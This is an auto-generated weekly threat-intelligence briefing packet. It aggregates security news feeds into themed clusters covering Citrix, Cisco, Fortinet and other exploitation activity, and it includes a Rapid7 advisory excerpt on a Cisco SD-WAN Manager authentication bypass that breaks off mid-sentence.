# PHANTOMSignal Briefing Packet

- Generated: 2026-10-06T16:38:08.645819+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 316
- Total clusters raw: 149
- Total clusters in packet: 67
- Dropped low score: 82
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 1
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 9
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 2
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 99
  - In window count: 7
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 20
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 12
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 20
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 7
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 26
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 23
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### Citrix exploitation (CVE-2026-88772)
- Anchor signal: Citrix
- Theme key: citrix
- Cluster count: 8
- Article count: 17
- Cohesion: 0.28
- Shared strong signals: Citrix
- Member CVEs: CVE-2026-88772
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, ddos, data_breach, ransomware_extortion
  - affected_industries: government, financial_services
  - affected_products: Citrix
  - cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88779
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: e51eaa3924, bd1b3dce0b, 257c7d4fe7, e0b5b97ad2, f28e2b9829, c18e100563, bf173c4cea, ef461b8ae5
- Links:
  - https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - https://thehackernews.com/2026/09/citrix-netscaler-cve-2026-88772-exploit.html
  - https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - https://cyberscoop.com/citrix-netscaler-zero-day-attacks-three-weeks-undetected/
  - https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
  - https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - https://www.securityweek.com/fbi-blames-contractors-missed-patch-for-shinyhunters-breach/
  - https://thehackernews.com/2026/10/fbi-removes-accenture-contractor-after.html
  - https://risky.biz/SRB185/
  - https://www.darkreading.com/cybersecurity-operations/kiteworks-citrix-incidents-challenges-zero-day-response

### ShinyHunters targeting Fortinet
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 8
- Article count: 10
- Cohesion: 0.428
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: npm
- Dominant features:
  - threat_categories: zero_day, active_exploitation, web_shell_backdoor, ransomware_extortion, data_breach
  - actor_attribution: ShinyHunters
  - affected_industries: financial_services, government, healthcare, critical_infrastructure
  - affected_products: Fortinet, Microsoft SharePoint, npm
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: bd1b3dce0b, e0b5b97ad2, 057570cc1b, e1bd66f397, c18e100563, bf173c4cea, 00b877b227, b99725e49d
- Links:
  - https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - https://cyberscoop.com/citrix-netscaler-zero-day-attacks-three-weeks-undetected/
  - https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
  - https://www.securityweek.com/8-8-million-impacted-by-data-breach-at-denmarks-central-person-register/
  - https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - https://www.securityweek.com/fbi-blames-contractors-missed-patch-for-shinyhunters-breach/
  - https://thehackernews.com/2026/10/fbi-removes-accenture-contractor-after.html
  - https://risky.biz/SRB185/
  - https://www.securityweek.com/long-running-npm-malware-campaign-accumulates-40000-downloads/
  - https://www.securityweek.com/250000-impacted-by-data-breaches-at-new-jersey-texas-healthcare-firms/

### Cisco vulnerability activity
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 3
- Article count: 7
- Cohesion: 0.248
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Cisco
- Cluster IDs: e8f8b3bb19, 9b43995709, fb1a8533f5
- Links:
  - https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - https://thehackernews.com/2026/09/cisco-warns-of-attackers-exploiting.html
  - https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
  - https://thehackernews.com/2026/10/antino-backdoor-uses-outlook-and.html
  - https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/

### CVE-2026-76504 exploitation activity
- Anchor signal: CVE-2026-76504
- Theme key: cve-2026-76504
- Cluster count: 3
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: CVE-2026-76504
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: education
  - cve_ids: CVE-2026-76504
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: e8f8b3bb19, f28e2b9829, 4e072e3956
- Links:
  - https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - https://thehackernews.com/2026/09/cisco-warns-of-attackers-exploiting.html
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/

### AWS vulnerability activity
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 3
- Article count: 6
- Cohesion: 0.417
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: AWS
- Cluster IDs: a8065d8a20, 82a8a896d6, 037cb026da
- Links:
  - https://orca.security/resources/blog/connect-orcas-chatgpt-plugin-cloud-risk-context-in-chat-and-codex/
  - https://thehackernews.com/2026/10/wikimedia-says-openai-agents-tried-to.html
  - https://cyberscoop.com/openai-moonshot-ai-model-distillation-attack/
  - https://securitylabs.datadoghq.com/articles/beyond-valid-credentials-how-exposed-aws-keys-are-tested-for-amazon-bedrock-access/
  - https://aws.amazon.com/blogs/security/aws-continuum-sets-a-new-standard-in-autonomous-code-security/

### GitLab vulnerability activity
- Anchor signal: GitLab
- Theme key: gitlab
- Cluster count: 3
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: GitLab
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: GitLab
  - urgency_signals: preauth_unauth, poc_available
- Cluster IDs: 48be01e909, 18981f1338, c18e100563
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - https://www.bleepingcomputer.com/news/security/rejetto-hfs-servers-now-actively-scanned-for-critical-rce-flaw/
  - https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html
  - https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html

### Microsoft Defender vulnerability activity
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft Defender
- Cluster IDs: a14cf81e36, 48be01e909
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/

### ScreenConnect vulnerability activity
- Anchor signal: ScreenConnect
- Theme key: screenconnect
- Cluster count: 2
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: ScreenConnect
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: ScreenConnect
- Cluster IDs: 143cae0708, 48be01e909
- Links:
  - https://isc.sans.edu/diary/rss/33400
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/

### CVE-2026-86950 exploitation activity
- Anchor signal: CVE-2026-86950
- Theme key: cve-2026-86950
- Cluster count: 2
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: CVE-2026-86950
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion
  - affected_industries: government
  - cve_ids: CVE-2026-86950
- Cluster IDs: 05eb2547bf, f28e2b9829
- Links:
  - https://www.darkreading.com/cyberattacks-data-breaches/apple-zero-day-vulnerability-weaponized-targeted-attacks
  - https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - https://www.infosecurity-magazine.com/news/apple-patches-coregraphics-zero/
  - https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/

## Forward signals

### Novelty
- Novel cves: 5
  - CVE-2026-63697 (first seen via Help Net Security at 2026-10-06T10:44:41+00:00, cluster be88512aa3)
  - CVE-2026-71168 (first seen via Help Net Security at 2026-10-06T10:44:41+00:00, cluster be88512aa3)
  - CVE-2026-86360 (first seen via Help Net Security at 2026-10-06T10:44:41+00:00, cluster be88512aa3)
  - CVE-2026-86361 (first seen via Help Net Security at 2026-10-06T10:44:41+00:00, cluster be88512aa3)
  - CVE-2026-86362 (first seen via Help Net Security at 2026-10-06T10:44:41+00:00, cluster be88512aa3)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (1)
- **Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570**
  - Cluster: a14cf81e36
  - Sources in window: 3
  - Window hours: 2.8
  - Cohort count: 2

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-20127 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-20182 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-76504 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-88771 + Citrix (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88771 + Palo Alto Networks (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88772 + Citrix (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88772 + Palo Alto Networks (cluster e51eaa3924, first observation: True)
- Pair: CVE-2026-88779 + Citrix (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-88779 + WordPress (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-88779 + npm (cluster bd1b3dce0b, first observation: True)
- Pair: CVE-2026-73570 + Microsoft Defender (cluster a14cf81e36, first observation: True)
- Pair: CVE-2026-88771 + Citrix (cluster 257c7d4fe7, first observation: True)
- Pair: CVE-2026-88779 + Citrix (cluster 257c7d4fe7, first observation: True)
- Pair: CVE-2026-104286 + Cl0p (cluster e0b5b97ad2, first observation: True)
- Pair: CVE-2026-104286 + ShinyHunters (cluster e0b5b97ad2, first observation: True)

### Drift (4)
- **Cl0p** (cluster e0b5b97ad2)
  - New industries: (none)
  - New products: Citrix, Fortinet
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft 365, OpenAI/ChatGPT, SolarWinds
- **ShinyHunters** (cluster e0b5b97ad2)
  - New industries: (none)
  - New products: Citrix, Fortinet
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Anthropic/Claude, OpenAI/ChatGPT, Salesforce
- **Nimbus Manticore** (cluster a781629acb)
  - New industries: (none)
  - New products: GitHub
  - Prior top industries: aviation_defense, critical_infrastructure, telecommunications
  - Prior top products: Apple iOS/macOS, Gogs, Microsoft Entra
- **Rhysida** (cluster 9f30a990e8)
  - New industries: education
  - New products: OpenAI/ChatGPT
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Apple iOS/macOS, Microsoft Defender, Snowflake

### Persistence (11)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster e0b5b97ad2)
- actor_attribution: Cl0p (weeks observed: 11, cluster e0b5b97ad2)
- cve_ids: CVE-2026-73570 (weeks observed: 4, cluster a14cf81e36)
- cve_ids: CVE-2026-39987 (weeks observed: 4, cluster 1a8594f0b4)
- actor_attribution: Rhysida (weeks observed: 4, cluster 9f30a990e8)
- cve_ids: CVE-2026-88771 (weeks observed: 3, cluster e51eaa3924)
- cve_ids: CVE-2026-88772 (weeks observed: 3, cluster e51eaa3924)
- cve_ids: CVE-2026-86950 (weeks observed: 3, cluster 05eb2547bf)
- actor_attribution: Nimbus Manticore (weeks observed: 3, cluster a781629acb)
- cve_ids: CVE-2026-85102 (weeks observed: 3, cluster 057570cc1b)
- cve_ids: CVE-2026-76460 (weeks observed: 3, cluster 4e072e3956)

### Tier inversion (0)

## Clusters

### Cluster e8f8b3bb19 — score 70

- Title: Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-30T15:09:22+00:00
- Link: https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: CVE-2026-76504

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Cisco
- cve_ids: CVE-2026-20127, CVE-2026-20182, CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-76504, CVE-2026-20127, CVE-2026-20182
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis,
```

#### Full body

```
Emergent Threat Response Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Rapid7 Sep 30, 2026 | Last updated on Oct 1, 2026 | 4 min read Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Table of contents Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504) Table of contents Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis, outside of normal patch cycles, and investigate internet-facing systems for signs of exploitation. Cisco Catalyst SD-WAN Manager was also affected by two critical, unauthenticated peering authentication flaws earlier in 2026: CVE-2026-20127 and Rapid7-discovered CVE-2026-20182 . Both were distinct issues in the vdaemon service and similar parts of its networking stack. CVE-2026-76504 targets a separate API authentication path, but the recurrence of authentication bypasses in internet-facing Catalyst SD-WAN control components reinforces the need for emergency remediation. On September 30, 2026, CVE-2026-76504 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV) , based on evidence of active exploitation. CISA set a remediation due date of October 3, 2026. Mitigation guidance Cisco has released software updates that remediate CVE-2026-76504. Organizations running affected instances of Cisco Catalyst SD-WAN Manager should upgrade to an appropriate fixed release listed below without 